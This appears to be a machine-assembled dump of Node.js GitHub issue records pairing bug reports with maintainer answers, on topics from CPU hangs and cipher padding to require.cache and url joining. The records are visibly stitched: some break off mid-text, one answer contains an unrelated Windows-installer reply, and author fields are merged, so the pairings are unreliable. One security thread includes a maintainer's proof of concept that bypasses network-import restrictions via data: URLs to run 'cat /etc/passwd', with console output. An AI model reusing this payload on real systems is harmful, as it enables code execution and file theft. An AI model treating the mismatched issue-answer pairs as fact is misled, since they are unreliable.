<!-- Enter your issue details below this comment. -->

Got situation with very high CPU usage on node 4.5 and 6.x.
The actual node.js process get stuck (no logs etc ...). 
 running ctrace prints this: 

``````
sudo ctrace -p 15084 -v
[15217] Trace on:  attach to process 15084
[pid:15094] [08:52:00.317489] futex, 202 -- fast user-space locking linux (0x1df27c4, FUTEX_WAIT_PRIVATE, 660, NULL <unfinished ...>
[pid:15090] [08:52:00.317855] futex, 202 -- fast user-space locking linux (0x2ab7f68, FUTEX_WAIT_PRIVATE, 0, NULL <unfinished ...>
[pid:15095] [08:52:00.328036] futex, 202 -- fast user-space locking linux (0x1df27c4, FUTEX_WAIT_PRIVATE, 660,
maintainer_answer: bnoordhuis (MEMBER): Start node with `--perf_basic_prof` and attach perf with `perf top -g -p <pid>` once node is running.  The gettimeofday system calls are almost certainly `new Date()` or `Date.now()` calls in JS code.

comments.author: bnoordhuis
comments.body: Start node with `--perf_basic_prof` and attach perf with `perf top -g -p <pid>` once node is running.  The gettimeofday system calls are almost certainly `new Date()` or `Date.now()` calls in JS code.

title: crypto.createDecipheriv for aes-128-cbc does not regard setAutoPadding == false
expected_behavior:
With `decipher.setAutoPadding = false;` it should be possible to disable padding. 
It is expected that the decrypted block in the example does have the same length than the input block.

### What do you see instead?

The decrypted block misses 1 byte (0x01) at the end.

### Additional information

_No response_
observed_behavior:
The decrypted block misses 1 byte (0x01) at the end.

### Additional information

_No response_
maintainer_answer:
tniessen (MEMBER): This is expected. You are not actually calling `setAutoPadding(false)` but overwriting the function-valued property with the constant `false`, which has no documented effect. If you actually call `setAutoPadding(false)` instead, you should be able to disable padding.

tniessen (MEMBER): No worries, JavaScript is a horrible language and unfortunately permits this kind of mistake way too easily.

> Some npm modules need to be compiled from C/C++ when installing. If you want to be able to install such modules, some tools (Python 2 and Visual Studio Build Tools) need to be installed

IMHO the text is clear. If you have an idea on how to improve it - PRs are always welcomed, the text for [the checkbox is here](https://github.com/nodejs/node/blob/76afdffdf4aed0ce944867d32545505d25b77118/tools/msvs/msi/i18n/en-us.wxl#L15-L17). Opening new PRs is easy, [we have a guide over here](https://github.com/nodejs/node/blob/76afdffdf4aed0ce944867d32545505d25b77118/doc/guides/contributing/pull-requests.md).

Oh, and the `@nodejs/platform-windows` pings people from the `platform-windows` group and notifies them about this issue.

title: Add method for creating blocking async code
problem_summary:
### What is the problem this feature will solve?

It will allow people to resolve race conditions. This is currently impossible when interacting with the filesystem in any way.

### What is the feature you are proposing to solve the problem?

A function that will prevent the currently executing function from continuing to the next line until a promise resolves, without forcing the programmer to make their entire function async

### What alternatives have you considered?

* using a setTimeout to wait for the task to continue, which doesn't work because the amount of time the operation will take is unknown.
* polling the filesystem constantly to make sure that every file is in its correct place before continuing, this fails because memory and CPU usage spikes massively whenever anything is moving
* using fs.cpSync to do the moving, which doesn't work because that function is apparently not actually synchronous in any way.
* Giving up on nodeJS entirely and moving to C#, Java, C++, or Golang, where this feature already exists, which would require me to rewrite my entire codebase.
maintainer_answer:
avivkeller (MEMBER): A few questions:
1. Could you provide an example?
2. Is this an issue for Node.js or JavaScript in general. If you have a general JS idea, please refer to TC39.

avivkeller (MEMBER): async API (Promises and similar constructs) is managed by the V8 engine, developed by Google/Chromium. This design adheres to the [Promises specification](https://tc39.es/ecma262/multipage/control-abstraction-objects.html#sec-promise-objects) defined in ECMAScript.

Based on my understanding, this isn't something that can be directly controlled by Node.js, as Node.js doesn't manage this API.

However, there are methods to monitor promises, although it's unclear if they can be used to block the event loop. It might be worth exploring the [`async_hooks`](https://nodejs.org/api/async_hooks.html) module. Additionally, `await` can be used to pause execution until asynchronous code has completed.

comments.author: avivkeller
comments.body:
A few questions:
1. Could you provide an example?
2. Is this an issue for Node.js or JavaScript in general. If you have a general JS idea, please refer to TC39.

comments.author: ChristopherJTrent
avivkeller
comments.body:
async API (Promises and similar constructs) is managed by the V8 engine, developed by Google/Chromium. This design adheres to the [Promises specification](https://tc39.es/ecma262/multipage/control-abstraction-objects.html#sec-promise-objects) defined in ECMAScript.

Based on my understanding, this isn't something that can be directly controlled by Node.js, as Node.js doesn't manage this API.

However, there are methods to monitor promises, although it's unclear if they can be used to block the event loop. It might be worth exploring the [`async_hooks`](https://nodejs.org/api/async_hooks.html) module. Additionally, `await` can be used to pause execution until asynchronous code has completed.

comments.author: ChristopherJTrent
comments.body:
> `await` can be used 

I'm not in an async function.
Making this an async function involves changing hundreds, or potentially thousands, of lines of code. 
I really don't think it's unreasonable to want a function to not return at all until after promise resolution. 

As for the issue with google, we all know how terrible they are about listening to people, so trying to get this changed upstream would be a complete waste of time.

comments.author: ChristopherJTrent
comments.body:
as for your comment about async_hooks, copied directly from the docs:
> We strongly discourage the use of the async_hooks API. Other APIs that can cover most of its use cases include:
    [AsyncLocalStorage](https://nodejs.org/api/async_context.html#class-asynclocalstorage) tracks async context
    [process.getActiveResourcesInfo()](https://nodejs.org/api/process.html#processgetactiveresourcesinfo) tracks active resources

comments.author: cjihrig
comments.body:
There a few things you can try if you don't want to use an async function:

- An npm module like `deasync`. You really shouldn't do that though.
- `Atomics`, which is already part of the language.

comments.author: ChristopherJTrent
comments.body:
>     * An npm module like `deasync`. You really shouldn't do that though.

Can you explain why? the issue here is that I'm stuck in promise hell, so a module that drags node kicking and screaming into synchronous land would be the solution to my issue

As for atomics, I have *zero* idea how that could possibly be used to ensure that a heaping pile of asynchronous filesystem operations complete before continuing, as it explicitly can only ever track an int32 array.

comments.author: ChristopherJTrent
comments.body: Well, after completely giving up on the idea that NodeJS could ever do anything simply, and passing all of the operations up 4 calls of Promise.all(), I was finally able to get this problem resolved, it just took about 4x as much code as it would have in a more reasonable language.

title: TypeError: Could not convert argument of type symbol to string when setting headers with Headers object in Node.js v22.2.0

Create a new Next.js project using the latest version (as of writing, it's Next.js 13.2.4).
In one of the pages , import the Headers object from undici and try to set headers,
let headers = new Headers();
headers.set('Access-Control-Allow-Credentials', true);
headers.set('Access-Control-Allow-Origin', '*');
headers.set('x-auth-token',' process.env.EXAMPLE.TOKEN');

title: Security question: Why are data: URIs and file: URIs treated differently in your security policy?
problem_summary:
I noticed [this bug report](https://hackerone.com/reports/2092749) and asked @RafaelGSS why `data:` URIs are treated differently from `file:` URIs in the node.js security policy, as attackers can simply write to a file and then import it to achieve the same effect.

Rafael responded with the following, asking me to file an issue in this bug tracker instead of elaborating on X:

> This vulnerability exposes a vulnerability according to Node.js threat model. I can expand more on that if you raise an issue.
> 
> But I certainly won't elaborate on a X thread :)

### How often does it reproduce? Is there a required condition?

_No response_

### What is the expected behavior? Why is that the expected behavior?

_No response_

### What do you see instead?

N/A. I was requested by @RafaelGSS to use this issue reporting form.

### Additional information

_No response_
expected_behavior:
_No response_

### What do you see instead?

N/A. I was requested by @RafaelGSS to use this issue reporting form.

### Additional information

_No response_
observed_behavior:
N/A. I was requested by @RafaelGSS to use this issue reporting form.

### Additional information

_No response_
maintainer_answer:
avivkeller (MEMBER): @nodejs/security-wg 
CC @RafaelGSS

RafaelGSS (MEMBER): So I couple of things first:

1. The report was disclosed limited, so that's explains why you can only read the summary:

> A security flaw in Node.js allows a bypass of network import restrictions.
By embedding non-network imports in data URLs, an attacker can execute arbitrary code, compromising system security.
Verified on various platforms, the vulnerability is mitigated by forbidding data URLs in network imports.
Exploiting this flaw can violate network import security, posing a risk to developers and servers.

I will try to adjust it either way.

2. I believe your question is unrelated to the vulnerability itself. I will provide more details about the report, but I might not be the best person to explain our resolvers. 

Imagine you have an HTTP server with two routes:

1. `/indirect` -> returns a
```
import childProcess from 'data:text/javascript,export { default } from "node:child_process"'
import http from 'data:text/javascript,export { default } from "node:http"'

console.log('BYPASSED')
const data = childProcess.execSync('cat /etc/passwd')
```
2. `/direct` -> returns a `import fs from 'node:fs/promises'`

While the `/direct` route produces the expected result:

```console
$ node --experimental-network-imports --import 'http://127.0.0.1:9999/direct.mjs' --eval ''

Error [ERR_NETWORK_IMPORT_DISALLOWED]: import of 'node:fs/promises' by http://localhost:9999/direct.mjs is not supported: only relative and absolute specifiers are supported.
```

the `/indirect` is a bypass of this feature's expectations

```console
$ node --experimental-network-imports --import 'http://127.0.0.1:9999/indirect.mjs' --eval ''
BYPASS
```

RafaelGSS (MEMBER): Also note, that we are discussing removing this feature entirely https://github.com/nodejs/node/pull/53822.

comments.author: avivkeller
comments.body:
@nodejs/security-wg 
CC @RafaelGSS

comments.author: RafaelGSS
comments.body:
So I couple of things first:

1. The report was disclosed limited, so that's explains why you can only read the summary:

> A security flaw in Node.js allows a bypass of network import restrictions.
By embedding non-network imports in data URLs, an attacker can execute arbitrary code, compromising system security.
Verified on various platforms, the vulnerability is mitigated by forbidding data URLs in network imports.
Exploiting this flaw can violate network import security, posing a risk to developers and servers.

I will try to adjust it either way.

2. I believe your question is unrelated to the vulnerability itself. I will provide more details about the report, but I might not be the best person to explain our resolvers. 

Imagine you have an HTTP server with two routes:

1. `/indirect` -> returns a
```
import childProcess from 'data:text/javascript,export { default } from "node:child_process"'
import http from 'data:text/javascript,export { default } from "node:http"'

console.log('BYPASSED')
const data = childProcess.execSync('cat /etc/passwd')
```
2. `/direct` -> returns a `import fs from 'node:fs/promises'`

While the `/direct` route produces the expected result:

```console
$ node --experimental-network-imports --import 'http://127.0.0.1:9999/direct.mjs' --eval ''

Error [ERR_NETWORK_IMPORT_DISALLOWED]: import of 'node:fs/promises' by http://localhost:9999/direct.mjs is not supported: only relative and absolute specifiers are supported.

comments.author: RafaelGSS
comments.body: Also note, that we are discussing removing this feature entirely https://github.com/nodejs/node/pull/53822.

comments.author: eligrey
comments.body:
Your response does not acknowledge my question about file: URIs.

I am repeating my question: Why are data: URIs treated differently from file: URIs? Attackers can simply write to a file and then import it to achieve the same effect.

comments.author: ghost
comments.body:
If you look at the docs for network imports, there's a [special restriction](https://nodejs.org/dist/latest/docs/api/esm.html#cannot-load-non-network-dependencies).

>### Cannot load non-network dependencies
>These modules cannot access other modules that are not over http: or https:.

The intention is that `file:` and `node:` imports will fail under a network import. This means a network import has no way to access the file system and so could not write to a file.

What seems to have happened here is embedding the prohibited import in a `data:` URL made it work, and gave access to the file system etc which shouldn't have been possible.

title: Clarification Needed: require('http') and require('node:http') with existing require.cache entries
problem_summary:
### Affected URL(s)

https://nodejs.org/docs/latest-v20.x/api/modules.html#core-modules

### Description of the problem

According to the [documentation](https://nodejs.org/docs/latest-v20.x/api/modules.html#core-modules):

>Core modules can be identified using the node: prefix, in which case it bypasses the require cache. For instance, require('node:http') will always return the built in HTTP module, even if there is require.cache entry by that name"

And:

>Some core modules are always preferentially loaded if their identifier is passed to require(). For instance, require('http') will always return the built-in HTTP module, even if there is a file by that name."

Given this, if require('http') always returns the built-in HTTP module, under what circumstances would a require.cache entry by that name exist, making it necessary to use require('node:http')?
maintainer_answer:
avivkeller (MEMBER): @nodejs/loaders

avivkeller (MEMBER): IIUC if you have a dependency named `http`, the internal module will be preferred, and overriding the cache will override everything.

avivkeller (MEMBER): IMO this should be converted to a discussion, am I okay to do that?

comments.author: avivkeller
comments.body: @nodejs/loaders

comments.author: aduh95
comments.body: If you populate `require.cache.http` manually, e.g. `node -e 'require("./test/fixtures/empty.js");require.cache.http = require.cache[require.resolve("./test/fixtures/empty.js")];console.log(require("http") === require("./test/fixtures/empty"));'`

comments.author: gitspeaks
comments.body: @aduh95 why is that allowed for preferentially loaded modules  ?

comments.author: aduh95
comments.body: I don’t understand the question, what is allowed?

comments.author: gitspeaks
comments.body: As your example demonstrates, manually modifying the cache entry for preferentially loaded core modules bypasses the intended preferential loading characteristics. This seems counterproductive to the purpose of preferential loading.

comments.author: avivkeller
comments.body: IIUC if you have a dependency named `http`, the internal module will be preferred, and overriding the cache will override everything.

comments.author: aduh95
comments.body:
I don’t know the reason, and it doesn’t really matter, that behavior cannot be changed without breaking the ecosystem. If you don’t like that behavior, you can add the `node:` prefix. 
The only thing we can do is improving the docs, if you have some suggestion, please share and/or open a PR.

comments.author: gitspeaks
gitspeaks
aduh95
comments.body:
> IIUC, the goal of preferential loading is to 'protect' core modules from being overwritten. Allowing manual manipulation of their cache entries seems to defeat this purpose.

Like I said, the “goal” does not really matter, it is the way it is, and changing it is simply not worth it at this point. As someone who wasn’t involved at all in the development of CJS, I can’t tell you what was the rationale behind this design choice – or maybe it was an oversight, again, I have no idea – but as a maintainer I can tell you that whatever it is, it won’t change the fact that we want maximum stability on that area of the code base, and any PR that would try to amend the behavior would likely get rejected. 
CJS has not the ideal API surface, and we’re trying to not repeat that with ESM (that’s one of the reasons we don’t expose the ESM module cache, for example); for CJS there’s not much we can do but improving the docs.

title: Feature request: url.join(baseUrl, ...others)
problem_summary:
<!--
Thank you for reporting an issue.

This issue tracker is for bugs and issues found within Node.js core.
If you require more general support please file an issue on our help
repo. https://github.com/nodejs/help


Please fill in as much of the template below as you're able.

Version: output of `node -v`
Platform: output of `uname -a` (UNIX), or version and 32 or 64-bit (Windows)
Subsystem: if known, please specify affected core module name

If possible, please provide code that demonstrates the problem, keeping it as
simple and free of external dependencies as you are able.
-->

* **Version**: v9.4.0
* **Platform**: Darwin
* **Subsystem**: url

<!-- Enter your issue details below this comment. -->

I want to join url href just like path.join, examples

```js
url.join('http://nodejs.org', 'dist', 'download') === 'http://nodejs.org/dist/download'
url.join('http://nodejs.org/dist', 'download') === 'http://nodejs.org/dist/download'
url.resolve('http://nodejs.org/dist', 'download') === 'http://nodejs.org/download'
url.join('http://nodejs.org/dist/', '/download') === 'http://nodejs.org/dist/download'
url.join('http://nodejs.org/dist', 'http://mirror.nodejs.org/dist') === 'http://mirro
maintainer_answer:
TimothyGu (MEMBER): How does this differ from `[baseUrl, ...others].join('/')`?

In any case, we are trying to move away from legacy URL APIs like `url.resolve()` in favor of the [WHATWG standard-compliant API](https://nodejs.org/api/url.html#url_the_whatwg_url_api). We probably will not consider this addition.

TimothyGu (MEMBER): `http://nodejs.org//foo/bar//baz/` is a valid URL that may have a different meaning from `http://nodejs.org/foo/bar/baz/`. It would be semantically incorrect to disallow this distinction.

resolution.fix_summary: Linked PR #6: Allow canonical_base to contain a path

linked_prs.title: Allow canonical_base to contain a path

comments.author: TimothyGu
comments.body:
How does this differ from `[baseUrl, ...others].join('/')`?

In any case, we are trying to move away from legacy URL APIs like `url.resolve()` in favor of the [WHATWG standard-compliant API](https://nodejs.org/api/url.html#url_the_whatwg_url_api). We probably will not consider this addition.

comments.author: XGHeaven
comments.body:
In some case, `others` maybe `['/foo', 'bar/', '/baz/']`. I want `path.join('http://nodejs.org', ...others)` to return `http://nodejs.org/foo/bar/baz/`. In your code, `['http://nodejs.org', ...others].join('/')` would get `http://nodejs.org//foo/bar//baz/`.

BTW, like `path.join`. You cannot use `[...paths].join(path.sep)` to replace it.

comments.author: TimothyGu
comments.body: `http://nodejs.org//foo/bar//baz/` is a valid URL that may have a different meaning from `http://nodejs.org/foo/bar/baz/`. It would be semantically incorrect to disallow this distinction.

comments.author: apapirovski
comments.body: There doesn't seem to be anything actionable here as such I'm going to close this.

comments.author: fider
ghost
comments.body: So, we can't have a function that everybody needs all the time because of semantical correctness?

comments.author: fider
thw0rted
comments.body: For those that come across this later, consider a combination of `url.format({protocol, hostname, port})` and `path.posix.join`.  If you don't pass a `pathname` to `format` then you will get exactly the origin of the absolute URL, no trailing slash.  Then, you just have to make sure the first token you pass to `path.posix.join` has a leading slash.  From there, all your arguments to `join` can have leading or trailing slashes, no problem.

comments.author: iorlas
comments.body:
Been stuck today with this simple issue. Kind of obvious to have resolve, which "resolves" url using all the semantic, but join should be there too, providing different semantic, meaning *different function*.

Falling back to use urljoin package from the npm.

Our usecase: use base url for CDN and append path to the asset. CDN url can come with or w/o the ending slash.

comments.author: thw0rted
comments.body: Have you tried `url.format` combined with `path.posix.join` as in my previous comment?
